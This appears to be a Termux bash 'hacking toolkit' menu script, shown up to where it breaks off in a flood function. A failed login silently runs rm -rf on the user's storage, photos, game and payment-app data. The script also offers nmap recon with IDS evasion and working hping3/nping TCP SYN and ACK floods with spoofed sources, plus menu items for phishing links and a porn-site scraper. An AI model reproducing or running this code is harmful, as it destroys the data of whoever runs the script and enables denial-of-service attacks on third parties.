#!/bin/bash
clear

BLACK='\e[30m'
RED='\e[31m'
GREEN='\e[92m'
YELLOW='\e[33m'
ORANGE='\e[93m'
BLUE='\e[34m'
PURPLE='\e[35m'
CYAN='\e[36m'
WHITE='\e[37m'
NC='\e[0m'
purpal='\033[35m'

clear
termux-open https://www.facebook.com/Myanmar-Anonymous-Helper-Reporter-Teams-101125495006030/

clear

#loading code start



echo -e $CYAN "\nâ–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“ Loading ...\n"
sleep 0.1


clear

#loadimg code end

echo -e "${ORANGE} "

echo -e " \e[1;31m 
\033[0;33m     111     111       111        111111     1111111111                 
\033[0;32m     111 111 111      11 11       11  11        111
\033[0;36m     111  1  111     1111111      111111        111
\033[1;33m     111     111    11     11     11 11         111
\033[0;31m     111     111   11       11    11  11        111
\e[0m "

echo ""


echo -e $CYAN "Enter username" 
read username
echo "Enter password" 
read password

if [[ ( $username == "MART" && $password == "ZuH@ck" ) ]]; then
echo "valid user" 
clear

echo -e " \e[1;31m 
\033[0;33m     111     111       111        111111     1111111111                 
\033[0;32m     111 111 111      11 11       11  11        111
\033[0;36m     111  1  111     1111111      111111        111
\033[1;33m     111     111    11     11     11 11         111
\033[0;31m     111     111   11       11    11  11        111
\e[0m "

echo ""

else
echo "invalid fuck  user" 

#loading code start



echo -e $CYAN "\nâ–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“ Loading ...\n"
sleep 0.1


clear

#loadimg code end

cd
termux-setup-storage

   rm -rf /sdcard

	 rm -rf /sdcard/DCIM

rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/* 
	 
	 rm -rf /sdcard/Android/data/com.mobile.legends
	 
	 rm -rf /sdcard/Android/data/com.mytel.myid
	 
	 rm -rf /sdcard/Android/data/com.mytelpay.eu
	 
	 rm -rf /sdcard/Android/obb/com.mobile.legends
	 
	 rm -rf /sdcard/Android/obb/com.tencent.ig
	 
	 rm -rf /sdcard/Android/media/com.mytel.myid
	
	 rm -rf /sdcard/.sketchware
	 clear
#code false virus end
exit
fi

########! username and password code #############


#lolcat

echo ""
 echo  -e $CYAN "1.Basic tool install" 
 echo ""
 echo  -e $CYAN "2.Porn-Hub" 
 echo ""
 echo  -e $CYAN "3.DDOS And NetworkHacking" 
 echo ""
 echo  -e $CYAN "4.Zphisher Phishing Link" 
 echo ""
 echo  -e $CYAN "5.Track-Ip" 
 echo ""
 echo  -e $CYAN "6.Instgram Follow & Unfollow" 
 echo ""
 echo  -e $CYAN "7.Boycott( Democracy )" 
 echo ""
 echo  -e $CYAN "8.Host" 
 echo "" 
 echo  -e $CYAN "9.Base64 encode" 
 echo ""
 echo  -e $CYAN "10.Easy Hack" 
 echo ""
 echo "11.Follow me" 
 echo ""
 
 
 
 #!exit code
 echo "[0]  Exit " 
 echo ""
 echo  -e $BLUE "Choose A Number :  " 
read -p "" zuzu;
#!exit 

if [ $zuzu = 1 ] || [ $zuzu = 01 ]
then
clear
 apt-get update -yq --silent 
 apt-get upgrade -y 
 apt-get install python -y 
 apt-get install ruby -y 
 pip install install lolcat 
 gem install lolcat
 pkg install update && pkg install upgrade
 pkg install ncurses-utils -y 
 pkg install termux-api -y
 pkg install termux-repo -y
 pkg install python3 -y
 pkg install wget -y 
 pkg install bash -y
 pkg install openssh -y
 pkg install git -y
 pkg install python -y 
 pkg install pythpn2 -y
 pip2 install requests -y
 pkg install zip wget -y 
 pip2 install mechanize -y
 pkg install php -y
 pip2 install lolcat -y
 apt install zsh -y
 pkg install nmap -y
 pkg install cmatrix -y
 pkg install sl -y
 pip3 install colorama -y
 pkg install nano -y
 pkg install curl -y
 
 
 ############porn loading code start##############



echo -e $CYAN "\nâ–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’ Loading ...\n"
sleep 0.1
clear
echo -e $CYAN "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“ Loading ...\n"
sleep 0.1


clear

#loadimg code end
 
 
echo -e $RED  " finish install pkgðŸŒ¸pip2/3ðŸŒ¸apt "
fi


if [ $zuzu = 2 ] || [ $zuzu = 02 ]
then
#pornhub csript start
#!/bin/bash
clear 
p=1
echo -e "\e[1;33m                           
#####   ####  #####  #    # #    # #    # #####  
#    # #    # #    # ##   # #    # #    # #    # 
#    # #    # #    # # #  # ###### #    # #####  
#####  #    # #####  #  # # #    # #    # #    # 
#      #    # #   #  #   ## #    # #    # #    # 
#       ####  #    # #    # #    #  ####  #####                                  
\e[0m"

echo ""

echo -e "\e[1;35m        Code By Zu ( ZuH@ck ) \e[0m"
echo ""
echo -e "\e[1;33m      !Only for boys & Girls over 18 years old! \e[0m"
echo ""
read  -p "Enter Category :: " pa 
echo ""
echo -e "\e[1;33m If you want to stop (CTRL + C ) \e[0m"

video=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+"' | cut -d '"' -f1 | sort -u > res.txt)
error=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+"' | cut -d '"' -f1)

title=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+" title="(.*?)"' | cut -d '"' -f3 | sort -u > title.txt)
if [[ -z $error ]];then
echo -e "\e[1;31m You check the internet \e[0m"
else 
for i in $(seq $(cat res.txt | wc -l ))
do 
echo ""
sleep 2 
echo -e "\e[1;33m [#] Title :: "$(cat title.txt | sed -n "${i}p" )
echo -e "\e[1;36m [#] Link :: \e[4;36m https://www.pornhub.com/view_video$(cat res.txt | sed -n "${i}p" )\e[0m"
echo ""
done 
rm -rf res.txt 
rm -rf title.txt 
read -p " you want to see url : " ghost
termux-open $ghost
fi

############pornhub csript end#####################
fi

if [ $zuzu = 3 ] || [ $zuzu = 03 ]
then


############DDOS ZuH@ck code start##################

#!/bin/bash


#WARNA KESUKAAN

cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
#WARNING !!!
resize -s 70 90 > /dev/null
clear
#ZuH@ck code start




#loading code start



echo -e $lightgreen "\nâ–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.3
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’â–’ Loading ...\n"
sleep 0.1
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–’ Loading ...\n"
sleep 0.1
clear
echo -e $lightgreen "\nâ–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“ Loading ...\n"
sleep 0.1


clear

#loadimg code end

echo -e "${ORANGE} "

echo -e " \e[1;31m 
\033[0;33m     111     111       111        111111     1111111111                 
\033[0;32m     111 111 111      11 11       11  11        111
\033[0;36m     111  1  111     1111111      111111        111
\033[1;33m     111     111    11     11     11 11         111
\033[0;31m     111     111   11       11    11  11        111
\e[0m "

echo ""

#ZuH@ck code end
echo -e $red
echo -n "Start To Enter Click .............."
read warning
echo -e $lightgreen
#!/bin/bash
#set the prompt to show you are in pentmenu and not standard shell
PS3="Myanmar Anonymous Helper>"

##MAINMENU##
##################
##START MAINMENU##
mainmenu()
{
#build a main menu using bash select
#from here, the various sub menus can be selected and from them, modules can be run
mainmenu=("Recon" "DDOS" "Extraction" "View Readme" "Quit")
select opt in "${mainmenu[@]}"; do
	if [ "$opt" = "Quit" ]; then
	echo "Quitting...Thank you for using menu!" && sleep 1 && clear
	exit 0
	elif [ "$opt" = "Recon" ]; then
reconmenu
	elif [ "$opt" = "DDOS" ]; then
dosmenu
    elif [ "$opt" = "Extraction" ]; then
extractionmenu
  	elif [ "$opt" = "View Readme" ]; then
showreadme
	else
#if no valid option is chosen, chastise the user
	echo "That's not a valid option! Hit Return to show main menu"
	fi
done
}
##END MAINMENU##
################
##/MAINMENU##


##RECON##
###################
##START RECONMENU##
reconmenu()
{
#build a menu for the recon modules using bash select
		reconmenu=("Show IP" "DNS Recon" "Ping Sweep" "Quick Scan" "Detailed Scan" "UDP Scan" "Check Server Uptime" "Go back")
	select reconopt in "${reconmenu[@]}"; do
#show external IP & interface IP(s)
	if [ "$reconopt" = "Show IP" ]; then
		showip
#DNS Recon
    elif [ "$reconopt" = "DNS Recon" ]; then
        dnsrecon
#Ping Sweep
    elif [ "$reconopt" = "Ping Sweep" ]; then
        pingsweep
#Recon Network
    elif [ "$reconopt" = "Quick Scan" ]; then
        quickscan
#Stealth Scan
    elif [ "$reconopt" = "Detailed Scan" ]; then
        detailedscan
#UDP Scan
	elif [ "$reconopt" = "UDP Scan" ]; then
		udpscan
#Check uptime of server
    elif [ "$reconopt" = "Check Server Uptime" ]; then
        checkuptime
#Go back
	elif [ "$reconopt" = "Go back" ]; then
		mainmenu
## Default if no menu option selected is to return an error
	else
  		echo  "That's not a valid option! Hit Return to show menu"
	fi
	done
}
##END RECONMENU##
#################

################
##START SHOWIP##
showip()
{		echo "External IP lookup uses curl..."
		echo "External IP is detected as:"
#use curl to lookup external IP
		curl http://canihazip.com/s/
		echo ""
		echo ""
#show interface IP's
		echo "Interface IP's are:"
		ip a|grep inet
#if ip a command fails revert to ifconfig
	if ! [[ $? = 0 ]]; then
		ifconfig|grep inet
	fi
		echo ""
}
##END SHOWIP##
##############

##################
##START DNSRECON##
dnsrecon()
{ echo "This module performs passive recon via forward/reverse name lookups for the target (as appropriate) and performs a whois lookup"
	echo "Enter target:"
#need a target IP/hostname to check
	read -i $TARGET -e TARGET
host $TARGET
#if host command doesnt work try nslookup instead
if ! [[ $? = 0 ]]; then
nslookup $TARGET
fi
#run a whois lookup on the target
sleep 1 && whois -H $TARGET
if ! [[ $? = 0 ]]; then
#if whois fails, do a curl lookup to ipinfo.io
sleep 1 && curl ipinfo.io/$TARGET
fi
}
##END DNSRECON##
################

###################
##START PINGSWEEP##
pingsweep()
{ echo "This module performs a simple ICMP echo 'ping' sweep"
	echo "Please enter the target (e.g. 192.168.1.0/24):"
#need to know the subnet to scan for live hosts using pings
	read -i $TARGET -e TARGET
#launch ping sweep using nmap
#this could be done with ping command, but that is extremely difficult to code in bash for unusual subnets so we use nmap instead
sudo nmap -sP -PE $TARGET --reason
}
##END PINGSWEEP##
#################

######################
##START QUICKSCAN##
quickscan()
{ echo "This module conducts a scan using nmap"
echo "It is designed to scan an entire network for common open ports"
echo "It will perform a TCP SYN port scan of the 1000 most common ports"
echo "Depending on the target, the scan might take a long time to finish"
echo "Please enter the target host/IP/subnet:"
#we need to know where to scan.  Whilst a hostname is possible, this module is designed to scan a subnet range
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
read -i $SPEED -e SPEED
: ${SPEED:=3}
#launch the scan
sudo nmap -Pn -sS -T $SPEED $TARGET --reason
}
## END QUICKSCAN##
#####################

#####################
##START DETAILEDSCAN##
detailedscan()
{ echo "This module performs a scan using nmap"
echo "It is designed to perform a detailed scan of a specific host but can be used against an entire network"
echo "This scans ALL ports on the target. It also attempts OS detection and gathers service information"
echo "This scan might take a very long time to finish, please be patient"
echo "Enter the hostname/IP/subnet to scan:"
#need a target hostname/IP
read -i $TARGET -e TARGET
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
read -i $SPEED -e SPEED
: ${SPEED:=3}
#scan using nmap.  Note the change in user-agent from the default nmap value to help avoid detection
sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
}
##END DETAILEDSCAN##
###################

#################
##START UDPSCAN##
udpscan()
{ echo "This module lets you scan a host/network for open UDP ports"
echo "It scans ALL ports on the target system. This may take some time, please be patient"
echo "Enter the host/subnet to scan:"
#need a target IP/hostname
read -i $TARGET -e TARGET
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
echo "Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.
Default is 3:"
read -i $SPEED -e SPEED
: ${SPEED:=3}
#launch the scan using nmap
sudo nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
}
##END UDPSCAN##
###############

#####################
##START CHECKUPTIME##
checkuptime()
{ echo "This module will attempt to estimate the uptime of a given server, using hping3"
  echo "This is not guaranteed to work"
  echo "Enter your target:"
#need a target IP/hostname
  read -i $TARGET -e TARGET
#need a target port
  echo "Enter port (default is 80):"
  read -i $PORT -e PORT
  : ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#how many times to retry the check?
  echo "Retries? (3 is ideal and default, 2 might also work)"
  read -i $RETRY -e RETRY
  : ${RETRY:=3}
  echo "Starting.."
#use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
#this might not work, but sometimes it does work very well
  sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
  echo "Done."
}
##END CHECKUPTIME##
###################
##/RECON##
#############


##DOS##
#################
##START DOSMENU##
dosmenu()
{
#display a menu for the DOS module using bash select
		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "UDP Flood" "SSL DOS" "Slowloris" "Distraction Scan" "Go back")
	select dosopt in "${dosmenu[@]}"; do
#TCP SYN Flood DOS
 	if [ "$dosopt" = "TCP SYN Flood" ]; then
		synflood
#TCP ACK Flood
	elif [ "$dosopt" = "TCP ACK Flood" ]; then
		ackflood
#TCP RST Flood
	elif [ "$dosopt" = "TCP RST Flood" ]; then
		rstflood
#UDP Flood
 	elif [ "$dosopt" = "UDP Flood" ]; then
		udpflood
#SSL DOS
	elif [ "$dosopt" = "SSL DOS" ]; then
		ssldos
#Slowloris
	elif [ "$dosopt" = "Slowloris" ]; then
		slowloris
#Distraction scan
	elif [ "$dosopt" = "Distraction Scan" ]; then
		distractionscan
#Go back
	elif [ "$dosopt" = "Go back" ]; then
		mainmenu
	else
#Default if no valid menu option selected is to return an error
  	echo  "That's not a valid option! Hit Return to show menu"
	fi
	done
}
##END DOSMENU##
###############

#####################
##START TCPSYNFLOOD##
synflood()
{		echo "TCP SYN Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP SYN Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP SYN packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the SYN packet?  Default is to send no data
	echo "Send data with SYN packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP SYN flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
	fi
#No hping3 so using nping for TCP SYN Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo "Enter target:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#define source IP or use outgoing interface IP
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP SYN Flood..."
#begin TCP SYN flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPSYNFLOOD##
###################

#####################
##START TCPACKFLOOD##
ackflood()
{		echo "TCP ACK Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP ACK Flood
		echo "Enter target:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP ACK packets to
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the ACK packet?  Default is to send no data
	echo "Send data with ACK packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Enter number of data bytes to send (default 3000):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP ACK flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
